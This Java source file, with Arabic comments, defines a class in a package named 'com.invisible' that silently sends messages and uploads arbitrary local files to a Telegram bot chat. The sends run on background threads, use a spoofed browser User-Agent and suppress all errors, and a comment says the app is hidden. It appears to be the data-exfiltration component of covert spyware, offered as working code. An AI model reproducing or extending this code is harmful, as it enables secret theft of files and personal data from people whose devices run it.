package com.invisible;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

/**
 * مكتبة إرسال البيانات لـ Telegram Bot API
 */
public class TelegramSocket {

    // ========== CONFIG - غير هاد القيم ==========
    private static final String TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
    // =============================================

    /**
     * إرسال رسالة نصية لتليغرام (في الخلفية)
     */
    public static void send(final String message) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                sendSync(message);
            }
        }).start();
    }

    /**
     * إرسال متزامن (للاستعمال من threads تانية)
     */
    public static void sendSync(String message) {
        HttpURLConnection conn = null;
        try {
            String urlStr = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");

            String postData = "chat_id=" + CHAT_ID
                    + "&text=" + URLEncoder.encode(message, "UTF-8")
                    + "&parse_mode=HTML"
                    + "&disable_web_page_preview=true";

            OutputStream os = conn.getOutputStream();
            os.write(postData.getBytes("UTF-8"));
            os.flush();
            os.close();

            conn.getInputStream().close();
        } catch (Exception ignored) {
            // Silent - التطبيق خفي ما يطلعش أخطاء
        } finally {
            if (conn != null) {
                try { conn.disconnect(); } catch (Exception ignored) {}
            }
        }
    }

    /**
     * إرسال ملف
     */
    public static void sendDocument(final String filePath, final String caption) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                try {
                    String boundary = "---BOUNDARY" + System.currentTimeMillis() + "---";
                    String urlStr = "https://api.telegram.org/bot" + TOKEN + "/sendDocument";
                    URL url = new URL(urlStr);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setDoOutput(true);
                    conn.setRequestMethod("POST");
                    conn.setConnectTimeout(20000);
                    conn.setReadTimeout(20000);
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                    java.io.File file = new java.io.File(filePath);
                    if (!file.exists()) return;

                    OutputStream os = conn.getOutputStream();
                    java.io.PrintWriter writer = new java.io.PrintWriter(
                            new java.io.OutputStreamWriter(os, "UTF-8"), true);

                    // chat_id
                    writer.append("--").append(boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                    writer.append(CHAT_ID).append("\r\n");

                    // caption
                    writer.append("--").append(boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                    writer.append(caption != null ? caption : file.getName()).append("\r\n");

                    // document
                    writer.append("--").append(boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"document\"; filename=\"")
                            .append(file.getName()).append("\"\r\n");
                    writer.append("Content-Type: application/octet-stream\r\n\r\n");
                    writer.flush();

                    java.io.FileInputStream fis = new java.io.FileInputStream(file);
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        os.write(buffer, 0, bytesRead);
                    }
                    fis.close();
                    os.flush();

                    writer.append("\r\n").append("--").append(boundary).append("--\r\n");
                    writer.flush();
                    writer.close();

                    conn.getInputStream().close();
                } catch (Exception ignored) {
                } finally {
                    if (conn != null) try { conn.disconnect(); } catch (Exception ignored) {}
                }
            }
        }).start();
    }
}
